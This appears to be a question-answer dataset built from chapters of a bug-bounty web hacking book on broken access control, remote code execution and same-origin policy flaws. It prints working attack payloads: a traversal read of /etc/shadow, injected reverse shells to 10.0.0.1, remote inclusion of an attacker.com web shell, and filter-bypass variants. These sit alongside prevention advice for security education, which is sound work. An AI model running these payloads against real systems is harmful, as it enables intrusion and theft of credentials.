requirements.\nBroken Access Control\nOur credit card processing example could also be classified as a broken\naccess control issue. Broken access control occurs when access control in an\napplication is improperly implemented and can be bypassed by an attacker.\nFor example, the IDOR vulnerabilities discussed in Chapter 10 are a com-\nmon broken access control issue that applications face.\nBut there are many other broken access control issues common in web\napplications that you should learn about if you hope to become an effective\nhacker. Let’s look at a few of them.\nExposed Admin Panels\nApplications sometimes neglect or forget to lock up sensitive functionalities\nsuch as the admin panels used to monitor the application. Developers may\nmistakenly assume that users can’t access these functionalities because they\naren’t linked from the main application, or because they’re hidden behind\nan obscure URL or port. But attackers can often access these admin panels\nwithout authentication, if they can locate them. For example, even if the\napplication example.com hides its admin panel behind an obscure URL such\nas https://example.com/YWRtaW4/admin.php, an attacker might still be able to\nfind it via Google dorks or URL brute-forcing.\nSometimes applications don’t implement the same access control mecha-\nnisms for each of the various ways of accessing their sensitive functionalities.\nSay the admin panel is properly secured so that only those with valid admin\ncredentials can access it. But if the request is coming from an internal\nIP address that the machine trusts, the admin panel won’t ask the user to\nauthenticate. In this case, if an attacker can find an SSRF vulnerability that\nallows them to send internal requests, they can access the admin panel with-\nout authentication.\nAttackers might also be able to bypass access control by tampering with\ncookies or request headers if they’re predictable. Let’s say the admin panel\ndoesn’t ask for credentials as long as the user requesting access presents the\ncookie admin=1 in their HTTP request. All the attacker has to do to bypass\nthis control is to add the cookie admin=1 to their requests.\nFinally, another common access control issue occurs when users can\nforce their browsing past the access control points. To understand what\n278 Chapter 17\nthis means, let’s say the usual way of accessing example.com’s admin panel is\nvia the URL https://example.com/YWRtaW4/admin.php. If you browse to that\nURL, you’ll be prompted to log in with your credentials. After that, you’ll\nbe redirected to https://example.com/YWRtaW4/dashboard.php, which is where\nthe admin panel resides. Users might be able to browse to https://example.com/\nYWRtaW4/dashboard.php and directly access the admin panel, without pro-\nviding credentials, if the application doesn’t implement access control at\nthe dashboard page.\nDirectory Traversal Vulnerabilities\nDirectory traversal vulnerabilities are another type of broken access control.\nThey happen when attackers can view, modify, or execute files they shouldn’t\nhave access to by manipulating filepaths in user-input fields.\nLet’s say example.com has a functionality that lets users access their uploaded\nfiles. Browsing to the URL http://example.com/uploads?file=example.jpeg will\ncause the application to display the file named example.jpeg in the user’s uploads\nfolder located at /var/www/html/uploads/USERNAME/.\nIf the application doesn’t implement input sanitization on the file\nparameter, a malicious user could use the sequence ../ to escape out of\nthe uploads folder and read arbitrary files on the system. The ../ sequence\nrefers to the parent directory of the current directory on Unix systems.\nFor instance, an attacker could use this request to access the /etc/shadow\nfile on the system:\nhttp://example.com/upload?file=../../../../../etc/shadow\nThe page would navigate to /var/www/html/uploads/USERNAME/../../\n../../../etc/shadow, which points to the /etc/shadow file at the system root! In\nLinux systems, the /etc/shadow file contains the hashed passwords of system\nusers. If the user running the web server has the permissions to view this\nfile, the attacker could now view it too. They could then crack the passwords\nfound in this file to gain access to privileged users’ accounts on the system.\nAttackers might also gain access to sensitive files like configuration files, log\nfiles, and source code.\nPrevention\nYou can prevent application logic errors by performing tests to verify that\nthe application’s logic is working as intended. This is best done by someone\nwho understands both the business requirements of the organization and\nthe development process of the application. You’ll need a detailed under-\nstanding of how your application works, how users interact with each other,\nhow functionalities are carried out, and how complex processes work.\nCarefully review each process for any logical flaws that might lead to a\nsecurity issue. Conduct rigorous and routine testing against each function-\nality that is critical to the application’s security.\nApplication Logic Errors and Broken Access Control 279\nNext, prevent broken access control issues with a variety of counter-\nmeasures. First, implement granular access control policies on all files and\nactions on a system. The code that implements the access control policies\nshould also be audited for potential bypasses. You can conduct a penetra-\ntion test to try to find holes in the access policy or its implementation. Make\nsure that access control policies are accurate. Also, make sure that the mul-\ntiple ways of accessing a service have consistent access control mechanisms.\nFor example, it shouldn’t matter whether the application is accessed via a\nmobile device, desktop device, or API endpoint. The same authentication\nrequirements, such as MFA, should apply for every individual access point.\nHunting for Application Logic Errors and Broken Access Control\nApplication logic errors and access control issues are some of the easiest\nbugs for beginners to find. Hunting for these vulnerabilities doesn’t involve\ntampering with code or crafting malicious inputs; instead, it requires cre-\native thinking and a willingness to experiment.\nStep 1: Learn About Your Target\nStart by learning about your target application. Browse the application as\na regular user to uncover functionalities and interesting features. You can\nalso read the application’s engineering blogs and documentation. The\nmore you understand about the architecture, development process, and\nbusiness needs of that application, the better you will be at spotting these\nvulnerabilities.\nFor example, if you find out that the application just added a new pay-\nment option for its online store, you can test that payment option first since\nnew features are often the least tested by other hackers. And if you find out\nthat the application uses WordPress, you should try to access /wp-admin/\nadmin.php, the default path for WordPress admin portals.\nStep 2: Intercept Requests While Browsing\nIntercept requests while browsing the site and pay attention to sensitive\nfunctionalities. Keep track of every request sent during these actions. Take\nnote of how sensitive functionalities and access control are implemented,\nand how they interact with client requests. For the new payment option\nyou found, what are the requests needed to complete the payment? Do any\nrequest parameters indicate the payment type or how much will be charged?\nWhen accessing the admin portal at /wp-admin/admin.php, are any special\nHTTP headers or parameters sent?\nStep 3: Think Outside the Box\nFinally, use your creativity to think of ways to bypass access control or other-\nwise interfere with application logic. Play with the requests that you have\nintercepted and craft requests that should not be granted. If you modify\nthe amount to be charged in a request parameter, will the application still\n280 Chapter 17\nprocess the transaction while charging you a lower amount? Can you switch\nthe payment type to a gift card even though you don’t have one? Can you\naccess the admin page by adding a special cookie, such as admin=1?\nEscalating the Attack\nEscalating application logic errors and broken access control depends\nentirely on the nature of the flaw you find. But a general rule of thumb is that\nyou can try to combine the application logic error or broken access control\nwith other vulnerabilities to increase their impact.\nFor example, a broken access control that gives you access to the admin\npanel with a console or application deployment capabilities can lead to\nremote code execution. If you can find the configuration files of a web\napplication, you can search for CVEs that pertain to the software versions\nin use to further compromise the application. You might also find creden-\ntials in a file that can be used to access different machines on the network.\nWhile the impact of a vulnerability like SQL injection or stored XSS is\noften clear, it isn’t always apparent what attackers can achieve with applica-\ntion logic errors and broken access control vulnerabilities. Think of ways\nmalicious users can exploit these vulnerabilities to the fullest extent, and\ncommunicate their impact in detail in your report.\nFinding Your First Application Logic Error or Broken\nAccess Control!\nFind your very first application logic error or broken access control vulner-\nability by using the tips you learned in this chapter:\n1. Learn about your target application. The more you understand about\nthe architecture and development process of the web application, the\nbetter you’ll be at spotting these vulnerabilities.\n2. Intercept requests while browsing the site and pay attention to sensitive\nfunctionalities. Keep track of every request sent during these actions.\n3. Use your creativity to think of ways to bypass access control or otherwise\ninterfere with application logic.\n4. Think of ways to combine the vulnerability you’ve found with other vul-\nnerabilities to maximize the potential impact of the flaw.\n5. Draft your report! Be sure to communicate to the receiver of the report\nhow the issue could be exploited by malicious users.\nApplication Logic Errors and Broken Access Control 281",
    "question": "What are application logic errors and broken access control vulnerabilities, and how can they be identified and exploited?",
    "summary": "Application logic errors and broken access control are different from input validation issues because they involve flaws in the application's logic or improper access restrictions. These vulnerabilities can be triggered by valid HTTP requests that manipulate the application's behavior or bypass security measures. To find them, one must use creativity and intuition rather than automated tools, as they often require understanding the application's business logic and how users interact with it. Broken access control can allow attackers to access sensitive resources without proper authentication, while application logic errors can lead to unintended consequences, such as bypassing multi-factor authentication or enabling unauthorized transactions. Both types of vulnerabilities are common and can be exploited by modifying requests or finding weaknesses in the application's logic and access policies."
  },
  {
    "start": 195,
    "end": 203,
    "text": "18\nREMOTE CODE E XECUTION\nRemote code execution (RCE) occurs when an\nattacker can execute arbitrary code on a\ntarget machine because of a vulnerability or\nmisconfiguration. RCEs are extremely danger-\nous, as attackers can often ultimately compromise the\nweb application or even the underlying web server.\nThere is no singular technique for achieving RCE. In previous chapters,\nI noted that attackers can achieve it via SQL injection, insecure deserializa-\ntion, and template injection. In this chapter, we’ll discuss two more strate-\ngies that may allow you to execute code on a target system: code injection\nand file inclusion vulnerabilities.\nBefore we go on, keep in mind that developing RCE exploits often\nrequires a deeper understanding of programming, Linux commands, and\nweb application development. You can begin to work toward this once you\nget the hang of finding simpler vulnerabilities.\nMechanisms\nSometimes attackers can achieve RCE by injecting malicious code directly\ninto executed code. These are code injection vulnerabilities. Attackers can also\nachieve RCE by putting malicious code into a file executed or included by\nthe victim application, vulnerabilities called file inclusions.\nCode Injection\nCode injection vulnerabilities happen when applications allow user input to\nbe confused with executable code. Sometimes this happens unintentionally,\nwhen applications pass unsanitized data into executed code; other times,\nthis is built into the application as an intentional feature.\nFor example, let’s say you’re a developer trying to build an online cal-\nculator. Python’s eval() function accepts a string and executes it as Python\ncode: eval(\"1+1\") would return 2, and eval(\"1*3\") would return 3. Because\nof its flexibility in evaluating a wide variety of user-submitted expressions,\neval() is a convenient way of implementing your calculator. As a result, say\nyou wrote the following Python code to perform the functionality. This\nprogram will take a user-input string, pass it through eval(), and return\nthe results:\ndef calculate(input):\nreturn eval(\"{}\".format(input))\nresult = calculate(user_input.calc)\nprint(\"The result is {}.\".format(result))\nUsers can send operations to the calculator by using the following GET\nrequest. When operating as expected, the following user input would out-\nput the string The result is 3:\nGET /calculator?calc=1+2\nHost: example.com\nBut since eval() in this case takes user-provided input and executes it\nas Python code, an attacker could provide the application with something\nmore malicious instead. Remember Python’s os.system() command from\nChapter 16, which executes its input string as a system command? Imagine\nan attacker submitted the following HTTP request to the calculate()\nfunction:\nGET /calculator?calc=\"__import__('os').system('ls')\"\nHost: example.com\nAs a result, the program would execute eval(\"__import__('os').system('ls')\")\nand return the results of the system command ls. Since eval() can be used\nto execute arbitrary code on the system, if you pass unsanitized user-input\n284 Chapter 18\ninto the eval() function, you have introduced a code injection vulnerability to\nyour application.\nThe attacker could also do something far more damaging, like the fol-\nlowing. This input would cause the application to call os.system() and spawn\na reverse shell back to the IP 10.0.0.1 on port 8080:\nGET /calculator?calc=\"__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')\"\nHost: example.com\nA reverse shell makes the target server communicate with the attacker’s\nmachine and establish a remotely accessible connection allowing attackers\nto execute system commands.\nAnother variant of code injection occurs when user input is concat-\nenated directly into a system command. This is also called a command\ninjection vulnerability. Aside from happening in web applications, command\ninjections are also incredibly prevalent in embedded web applications\nbecause of their dependency on shell commands and frameworks using\nwrappers that execute shell commands.\nLet’s say example.com also has a functionality that allows you to down-\nload a remote file and view it on the website. To achieve this functionality,\nthe application uses the system command wget to download the remote file:\nimport os\ndef download(url):\nos.system(\"wget -O- {}\".format(url))\ndisplay(download(user_input.url))\nThe wget command is a tool that downloads web pages given a URL,\nand the -O- option makes wget download the file and display it in standard\noutput. Put together, this program takes a URL from user input and passes\nit into the wget command executed using os.system(). For example, if you\nsubmit the following request, the application would download the source\ncode of Google’s home page and display it to you:\nGET /download?url=google.com\nHost: example.com\nSince the user input is passed into a system command directly, attackers\ncould inject system commands without even using a Python function. That’s\nbecause, on the Linux command line, the semicolon (;) character separates\nindividual commands, so an attacker could execute arbitrary commands\nafter the wget command by submitting whatever command they want after a\nsemicolon. For instance, the following input would cause the application to\nspawn a reverse shell back to the IP 10.0.0.1 on port 8080:\nGET /download?url=\"google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\"\nHost: example.com\nRemote Code Execution 285\nFile Inclusion\nMost programming languages have functionality that allows developers to\ninclude external files to evaluate the code contained within it. This is useful\nwhen developers want to incorporate external asset files like images into\ntheir applications, make use of external code libraries, or reuse code that is\nwritten for a different purpose.\nAnother way attackers can achieve RCE is by making the target server\ninclude a file containing malicious code. This file inclusion vulnerability has\ntwo subtypes: remote file inclusion and local file inclusion.\nRemote file inclusion vulnerabilities occur when the application allows\narbitrary files from a remote server to be included. This happens when\napplications dynamically include external files and scripts on their pages\nand use user input to determine the location of the included file.\nTo see how this works, let’s look at a vulnerable application. The fol-\nlowing PHP program calls the PHP include function on the value of the\nuser-submitted HTTP GET parameter page. The include function then\nincludes and evaluates the specified file:\n<?php\n// Some PHP code\n$file = $_GET[\"page\"];\ninclude $file;\n// Some PHP code\n?>\nThis code allows users to access the various pages of the website by\nchanging the page parameter. For example, to view the site’s Index and\nAbout pages, the user can visit http://example.com/?page=index.php and\nhttp://example.com/?page=about.php, respectively.\nBut if the application doesn’t limit which file the user includes with the\npage parameter, an attacker can include a malicious PHP file hosted on their\nserver and get that executed by the target server.\nIn this case, let’s host a PHP page named malicious.php that will execute\nthe string contained in the URL GET parameter cmd as a system command.\nThe system() command in PHP is similar to os.system() in Python. They\nboth execute a system command and display the output. Here is the content\nof our malicious PHP file:\n<?PHP\nsystem($_GET[\"cmd\"]);\n?>\nIf the attacker loads this page on example.com, the site will evaluate the\ncode contained in malicious.php located on the attacker’s server. The malicious\nscript will then make the target server execute the system command ls:\nhttp://example.com/?page=http://attacker.com/malicious.php?cmd=ls\n286 Chapter 18\nNotice that this same feature is vulnerable to SSRF and XSS too. This\nendpoint is vulnerable to SSRF because the page could load info about the\nlocal system and network. Attackers could also make the page load a mali-\ncious JavaScript file and trick the user into clicking it to execute a reflected\nXSS attack.\nOn the other hand, local file inclusions happen when applications include\nfiles in an unsafe way, but the inclusion of remote files isn’t allowed. In this\ncase, attackers need to first upload a malicious file to the local machine,\nand then execute it by using local file inclusion. Let’s modify our previous\nexample a bit. The following PHP file first gets the HTTP GET parameter\npage and then calls the PHP include function after concatenating page with\na directory name containing the files users can load:\n<?php\n// Some PHP code\n$file = $_GET[\"page\"];\ninclude \"lang/\".$file;\n// Some PHP code\n?>\nThe site’s lang directory contains its home page in multiple languages.\nFor example, users can visit http://example.com/?page=de-index.php and http://\nexample.com/?page=en-index.php to visit the German and English home pages,\nrespectively. These URLs will cause the website to load the page /var/www/\nhtml/lang/de-index.php and /var/www/html/lang/en-index.php to display the\nGerman and English home pages.\nIn this case, if the application doesn’t place any restrictions on the pos-\nsible values of the page parameter, attackers can load a page of their own\nby exploiting an upload feature. Let’s say that example.com allows users to\nupload files of all file types, then stores them in the /var/www/html/uploads/\nUSERNAME directory. The attacker could upload a malicious PHP file to the\nuploads folder. Then they could use the sequence ../ to escape out of the\nlang directory and execute the malicious uploaded file on the target server:\nhttp://example.com/?page=../uploads/USERNAME/malicious.php\nIf the attacker loads this URL, the website will include the file /var/\nwww/html/lang/../uploads/USERNAME/malicious.php, which points to /var/\nwww/html/uploads/USERNAME/malicious.php.\nPrevention\nTo prevent code injections, you should avoid inserting user input into code\nthat gets evaluated. Also, since user input can be passed into evaluated\ncode through files that are parsed by the application, you should treat user-\nuploaded files as untrusted, as well as protect the integrity of existing sys-\ntem files that your programs execute, parse, or include.\nRemote Code Execution 287\nAnd to prevent file inclusion vulnerabilities, you should avoid includ-\ning files based on user input. If that isn’t possible, disallow the inclusion\nof remote files and create an allowlist of local files that your programs can\ninclude. You can also limit file uploads to certain safe file types and host\nuploaded files in a separate environment than the application’s source code.\nAlso avoid calling system commands directly and use the programming\nlanguage’s system APIs instead. Most programming languages have built-in\nfunctions that allow you to run system commands without risking command\ninjection. For instance, PHP has a function named mkdir(DIRECTORY_NAME).\nYou can use it to create new directories instead of calling system(\"mkdir\nDIRECTORY_NAME\").\nYou should implement strong input validation for input passed into\ndangerous functions like eval() or include(). But this technique cannot be\nrelied on as the only form of protection, because attackers are constantly\ncoming up with inventive methods to bypass input validation.\nFinally, staying up-to-date with patches will prevent your application’s\ndependencies from introducing RCE vulnerabilities. An application’s depen-\ndencies, such as open source packages and components, often introduce vul-\nnerabilities into an application. This is also called a software supply chain attack.\nYou can also deploy a web application firewall (WAF) to block suspicious\nattacks. Besides preventing RCEs, this could also help prevent some of the vul-\nnerabilities I’ve discussed earlier in this book, such as SQL injection and XSS.\nIf an attacker does achieve RCE on a machine, how could you minimize\nthe harm they can cause? The principle of least privilege states that applications\nand processes should be granted only the privileges required to complete\ntheir tasks. It is a best practice that lowers the risk of system compromise\nduring an attack because attackers won’t be able to gain access to sensi-\ntive files and operations even if they compromise a low-privileged user or\nprocess. For example, when a web application requires only read access to\na file, it shouldn’t be granted any writing or execution permissions. That’s\nbecause, if an attacker hijacks an application that runs with high privilege,\nthe attacker can gain its permissions.\nHunting for RCEs\nLike many of the attacks we’ve covered thus far, RCEs have two types: clas-\nsic and blind. Classic RCEs are the ones in which you can read the results\nof the code execution in a subsequent HTTP response, whereas blind RCEs\noccur when the malicious code is executed but the returned values of the\nexecution do not appear in any HTTP response. Although attackers cannot\nwitness the results of their executions, blind RCEs are just as dangerous as\nclassic RCEs because they can enable attackers to spawn reverse shells or\nexfiltrate data to a remote server. Hunting for these two types of RCE is a\nsimilar process, but the commands or code snippets you’ll need to use to\nverify these vulnerabilities will differ.\n288 Chapter 18\nHere are some commands you can use when attacking Linux servers.\nWhen hunting for a classic RCE vulnerability, all you need to do to verify the\nvulnerability is to execute a command such as whoami, which outputs the user-\nname of the current user. If the response contains the web server’s username,\nsuch as www-data, you’ve confirmed the RCE, as the command has success-\nfully run. On the other hand, to validate a blind RCE, you’ll need to execute\na command that influences system behavior, like sleep 5, which delays the\nresponse by five seconds. Then if you experience a five-second delay before\nreceiving a response, you can confirm the vulnerability. Similar to the blind\ntechniques we used to exploit other vulnerabilities, you can also set up a lis-\ntener and attempt to trigger out-of-band interaction from the target server.\nStep 1: Gather Information About the Target\nThe first step to finding any vulnerability is to gather information about the\ntarget. When hunting for RCEs, this step is especially important because\nthe route to achieving an RCE is extremely dependent on the way the target\nis built. You should find out information about the web server, program-\nming language, and other technologies used by your current target. Use the\nrecon steps outlined in Chapter 5 to do this.\nStep 2: Identify Suspicious User Input Locations\nAs with finding many other vulnerabilities, the next step to finding any RCE\nis to identify the locations where users can submit input to the application.\nWhen hunting for code injections, take note of every direct user-input loca-\ntion, including URL parameters, HTTP headers, body parameters, and file\nuploads. Sometimes applications parse user-supplied files and concatenate\ntheir contents unsafely into executed code, so any input that is eventually\npassed into commands is something you should look out for.\nTo find potential file inclusion vulnerabilities, check for input locations\nbeing used to determine filenames or paths, as well as any file-upload func-\ntionalities in the application.\nStep 3: Submit Test Payloads\nThe next thing you should do is to submit test payloads to the application.\nFor code injection vulnerabilities, try payloads that are meant to be inter-\npreted by the server as code and see if they get executed. For example,\nhere’s a list of payloads you could use:\nPython payloads\nThis command is designed to print the string RCE test! if Python execu-\ntion succeeds:\nprint(\"RCE test!\")\nThis command prints the result of the system command ls:\n\"__import__('os').system('ls')\"\nRemote Code Execution 289\nThis command delays the response for 10 seconds:\n\"__import__('os').system('sleep 10')\"\nPHP payloads\nThis command is designed to print the local PHP configuration infor-\nmation if execution succeeds:\nphpinfo();\nThis command prints the result of the system command ls:\n<?php system(\"ls\");?>\nThis command delays the response for 10 seconds:\n<?php system(\"sleep 10\");?>\nUnix payloads\nThis command prints the result of the system command ls:\n;ls;\nThese commands delay the response for 10 seconds:\n| sleep 10;\n& sleep 10;\n` sleep 10;`\n$(sleep 10)\nFor file inclusion vulnerabilities, you should try to make the endpoint\ninclude either a remote file or a local file that you can control. For\nexample, for remote file inclusion, you could try several forms of a\nURL that points to your malicious file hosted offsite:\nhttp://example.com/?page=http://attacker.com/malicious.php\nhttp://example.com/?page=http:attacker.com/malicious.php\nAnd for local file inclusion vulnerabilities, try different URLs pointing\nto local files that you control:\nhttp://example.com/?page=../uploads/malicious.php\nhttp://example.com/?page=..%2fuploads%2fmalicious.php\nYou can use the protection-bypass techniques you learned in Chapter 13\nto construct different forms of the same URL.\nStep 4: Confirm the Vulnerability\nFinally, confirm the vulnerability by executing harmless commands like\nwhoami, ls, and sleep 5.\n290 Chapter 18\nEscalating the Attack\nBe extra cautious when escalating RCE vulnerabilities. Most companies\nwould prefer that you don’t try to escalate them at all because they don’t want\nsomeone poking around systems that contain confidential data. During a\ntypical penetration test, a hacker will often try to figure out the privileges of\nthe current user and attempt privilege-escalation attacks after they gain RCE.\nBut in a bug bounty context, this isn’t appropriate. You might accidentally\nread sensitive information about customers or cause damage to the systems\nby modifying a critical file. It’s important that you carefully read the bounty\nprogram rules so you don’t cross the lines.\nFor classic RCEs, create a proof of concept that executes a harmless\ncommand like whoami or ls. You can also prove you’ve found an RCE by read-\ning a common system file such as /etc/passwd. You can use the cat command\nto read a system file:\ncat /etc/passwd\nOn Linux systems, the /etc/passwd file contains a list of the system’s\naccounts and their user IDs, group IDs, home directories, and default shells.\nThis file is usually readable without special privileges, so it’s a good file to try\nto access first.\nFinally, you can create a file with a distinct filename on the system, such\nas rce_by_YOUR_NAME.txt so it’s clear that this file is a part of your POC.\nYou can use the touch command to create a file with the specified name in\nthe current directory:\ntouch rce_by_YOUR_NAME.txt\nFor blind RCEs, create a POC that executes the sleep command. You\ncan also create a reverse shell on the target machine that connects back to\nyour system for a more impactful POC. However, this is often against pro-\ngram rules, so be sure to check with the program beforehand.\nIt’s easy to step over the bounds of the bounty policy and cause unin-\ntended damage to the target site when creating POCs for RCE vulnerabili-\nties. When you create your POC, make sure that your payload executes a\nharmless command and that your report describes the steps needed to\nachieve RCE. Often, reading a nonsensitive file or creating a file under a\nrandom path is enough to prove your findings.\nBypassing RCE Protection\nMany applications have caught on to the dangers of RCE and employ either\ninput validation or a firewall to stop potentially malicious requests. But pro-\ngramming languages are often quite flexible, and that enables us to work\nwithin the bounds of the input validation rules to make our attack work!\nHere are some basic input validation bypasses you can try in case the appli-\ncation is blocking your payloads.\nRemote Code Execution 291\nFor Unix system commands, you can insert quotes and double quotes\nwithout changing the command’s behavior. You can also use wildcards\nto substitute for arbitrary characters if the system is filtering out certain\nstrings. Finally, any empty command substitution results can be inserted\ninto the string without changing the results. For example, the following\ncommands will all print the contents of /etc/shadow:\ncat /etc/shadow\ncat \"/e\"tc'/shadow'\ncat /etc/sh*dow\ncat /etc/sha``dow\ncat /etc/sha$()dow\ncat /etc/sha${}dow\nYou can also vary the way you write the same command in PHP. For\nexample, PHP allows you to concatenate function names as strings. You can\neven hex-encode function names, or insert PHP comments in commands\nwithout changing their outcome:\n/* Text surrounded by these brackets are comments in PHP. */\nFor example, say you want to execute this system command in PHP:\nsystem('cat /etc/shadow');\nThe following example executes a system command by concatenating\nthe strings sys and tem:\n('sys'.'tem')('cat /etc/shadow');\nThe following example does the same thing but inserts a blank com-\nment in the middle of the command:\nsystem/**/('ls');\nAnd this line of code is a hex-encoded version of the system command:\n'\\x73\\x79\\x73\\x74\\x65\\x6d'('ls');\nSimilar behavior exists in Python. The following are all equivalent in\nPython syntax:\n__import__('os').system('cat /etc/shadow')\n__import__('o'+'s').system('cat /etc/shadow')\n__import__('\\x6f\\x73').system('cat /etc/shadow')\nAdditionally, some servers concatenate the values of multiple param-\neters that have the same name into a single value. In this case, you can split\n292 Chapter 18\nmalicious code into chunks to bypass input validation. For example, if the\nfirewall blocks requests that contain the string system, you can split your\nRCE payload into chunks, like so:\nGET /calculator?calc=\"__import__('os').sy\"&calc=\"stem('ls')\"\nHost: example.com\nThe parameters will get through the firewall without issue, since the\nrequest technically doesn’t contain the string system. But when the server\nprocesses the request, the parameter values will be concatenated into a\nsingle string that forms our RCE payload: \"__import__('os').system('ls')\".\nThis is only a tiny subset of filter bypasses you can try; many more exist.\nFor example, you can hex-encode, URL-encode, double-URL-encode, and\nvary the cases (uppercase or lowercase characters) of your payloads. You\ncan also try to insert special characters such as null bytes, newline charac-\nters, escape characters (\\), and other special or non-ASCII characters into\nthe payload. Then, observe which payloads are blocked and which ones suc-\nceed, and craft exploits that will bypass the filter to accomplish your desired\nresults. If you’re interested in this topic, search online for RCE filter bypass\nor WAF bypass to learn more. Additionally, the principles mentioned in this\nsection can be used to bypass input validation for other vulnerabilities as\nwell, such as SQL injection and XSS.\nFinding Your First RCE!\nIt’s time to find your first RCE by using the tips and tricks you’ve learned in\nthis chapter.\n1. Identify suspicious user-input locations. For code injections, take note\nof every user-input location, including URL parameters, HTTP head-\ners, body parameters, and file uploads. To find potential file inclusion\nvulnerabilities, check for input locations being used to determine or\nconstruct filenames and for file-upload functions.\n2. Submit test payloads to the input locations in order to detect potential\nvulnerabilities.\n3. If your requests are blocked, try protection-bypass techniques and see if\nyour payload succeeds.\n4. Finally, confirm the vulnerability by trying to execute harmless com-\nmands such as whoami, ls, and sleep 5.\n5. Avoid reading sensitive system files or altering any files with the vulner-\nability you’ve found.\n6. Submit your first RCE report to the program!\nRemote Code Execution 293",
    "question": "What are the two main strategies attackers use to achieve remote code execution (RCE) and how can they be prevented?",
    "summary": "Remote code execution (RCE) occurs when an attacker can run arbitrary code on a target system due to a vulnerability or misconfiguration. Common methods include code injection, where user input is treated as executable code, and file inclusion, where malicious files are loaded or included by the application. To prevent RCE, developers should avoid using user input in code execution, validate inputs, and restrict file inclusions to trusted local files."
  },
  {
    "start": 204,
    "end": 213,
    "text": "19\nSAME-ORIGIN POLICY\nVULNER ABILITIES\nChapter 3 introduced the same-origin pol-\nicy (SOP), one of the fundamental defenses\ndeployed in modern web applications. The\nSOP restricts how a script originating from\none site can interact with the resources of a different\nsite, and it’s critical in preventing many common web\nvulnerabilities.\nBut websites often loosen the SOP in order to have more flexibility.\nThese controlled and intended SOP bypasses can have adverse effects, as\nattackers can sometimes exploit misconfigurations in these techniques to\nbypass the SOP. These exploits can cause private information leaks and\noften lead to more vulnerabilities, such as authentication bypass, account\ntakeover, and large data breaches. In this chapter, we’ll discuss how appli-\ncations relax or work around the SOP and how attackers can exploit these\nfeatures to endanger the application.\nMechanisms\nHere’s a quick review of how the SOP works. Because of the SOP, a script\nfrom page A can access data from page B only if the pages are of the same\norigin. Two URLs are said to have the same origin if they share the same\nprotocol, hostname, and port number. Modern web applications often base\ntheir authentication on HTTP cookies, and servers take action based on the\ncookies included automatically by the browser. This makes the SOP espe-\ncially important. When the SOP is implemented, malicious web pages won’t\nbe able to take advantage of the cookies stored in your browser to access\nyour private information. You can read more about the details of the SOP\nin Chapter 3.\nPractically, the SOP is often too restrictive for modern web applications.\nFor example, multiple subdomains or multiple domains of the same orga-\nnization wouldn’t be able to share information if they followed the policy.\nSince the SOP is inflexible, most websites find ways to relax it. This is often\nwhere things go wrong.\nFor instance, imagine that you are an attacker trying to smuggle infor-\nmation out of a banking site, a.example.com, and find a user’s account num-\nber. You know that a user’s banking details are located at a.example.com/\nuser_info. Your victim is logged into the banking site at a.example.com and is\nalso visiting your site, attacker.com, in the same browser.\nYour site issues a GET request to a.example.com/user_info to retrieve the\nvictim’s personal information. Since your victim is logged into the bank,\ntheir browser automatically includes their cookies in every request it sends\nto a.example.com, even if the request is generated by a script on your mali-\ncious site. Unfortunately, because of the SOP, the victim’s browser won’t\nallow your site to read data returned from a.example.com.\nBut now, say you realize that a.example.com passes information to b.example\n.com via SOP bypass techniques. If you can find out the technique used and\nexploit it, you might be able to steal the victim’s private information on the\nbanking site.\nThe simplest way for websites to work around the SOP is to change the\norigin of a page via JavaScript. Setting the origin of two pages to the same\ndomain using document.domain in the pages’ JavaScript will enable the pages\nto share resources. For example, you can set the domain of both a.example\n.com and b.example.com to example.com so that they can interact:\ndocument.domain = \"example.com\"\nHowever, this approach has its limitations. First, you can only set the\ndocument.domain of a page to a superdomain; for example, you can set the\norigin of a.example.com to example.com, but not to example2.com. Therefore,\nthis method will work only if you want to share resources with super-\ndomains or sibling subdomains.\n296 Chapter 19\nExploiting Cross-Origin Resource Sharing\nBecause of these limitations, most sites use Cross-Origin Resource Sharing\n(CORS) to relax the SOP instead. CORS is a mechanism that protects\nthe data of the server. It allows servers to explicitly specify a list of origins\nthat are allowed to access its resources via the HTTP response header\nAccess-Control-Allow-Origin.\nFor example, let’s say we’re trying to send the following JSON blob\nlocated at a.example.com/user_info to b.example.com:\n{\"username\": \"vickieli\", \"account_number\": \"12345\"}\nUnder the SOP, b.example.com won’t be able to access the JSON file,\nbecause a.example.com and b.example.com are of different origins. But using CORS,\nthe user’s browser will send an Origin header on behalf of b.example.com:\nOrigin: https://b.example.com\nIf b.example.com is part of an allowlist of URLs with permission to access\nresources on a.example.com, a.example.com will send the browser the requested\nresource along with an Access-Control-Allow-Origin header. This header will\nindicate to the browser that a specific origin is allowed to access the resource:\nAccess-Control-Allow-Origin: b.example.com\nThe application can also return the Access-Control-Allow-Origin header\nwith a wildcard character (*) to indicate that the resource on that page can\nbe accessed by any domain:\nAccess-Control-Allow-Origin: *\nOn the other hand, if the origin of the requesting page isn’t allowed to\naccess the resource, the user’s browser will block the requesting page from\nreading the data.\nCORS is a great way to implement cross-origin communication.\nHowever, CORS is safe only when the list of allowed origins is properly\ndefined. If CORS is misconfigured, attackers can exploit the misconfigu-\nration and access the protected resources.\nThe most basic misconfiguration of CORS involves allowing the null\norigin. If the server sets Access-Control-Allow-Origin to null, the browser will\nallow any site with a null origin header to access the resource. This isn’t safe\nbecause any origin can create a request with a null origin. For instance,\ncross-site requests generated from a document using the data: URL scheme\nwill have a null origin.\nAnother misconfiguration is to set the Access-Control-Allow-Origin header\nto the origin of the requesting page without validating the requestor’s origin.\nIf the server doesn’t validate the origin and returns an Access-Control-Allow\n-Origin for any origin, the header will completely bypass the SOP, removing\nall limitations on cross-origin communication.\nSame-Origin Policy Vulnerabilities 297\nIn summary, if the server sets the Access-Control-Allow-Origin header\nto null or to arbitrary origins of the requesting page, it allows attackers to\nsmuggle information offsite:\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Origin: https://attacker.com\nAnother exploitable misconfiguration occurs when a site uses weak\nregexes to validate origins. For example, if the policy checks only if an ori-\ngin URL starts with www.example.com, the policy can be bypassed using an\norigin like www.example.com.attacker.com.\nAccess-Control-Allow-Origin: https://www.example.com.attacker.com\nAn interesting configuration that isn’t exploitable is setting the allowed\norigins to the wildcard (*). This isn’t exploitable because CORS doesn’t\nallow credentials, including cookies, authentication headers, or client-side\ncertificates, to be sent with requests to these pages. Since credentials cannot\nbe sent in requests to these pages, no private information can be accessed:\nAccess-Control-Allow-Origin: *\nDevelopers can prevent CORS misconfigurations by creating a well-\ndefined CORS policy with a strict allowlist and robust URL validation. For\npages containing sensitive information, the server should return the request-\ning page’s origin in the 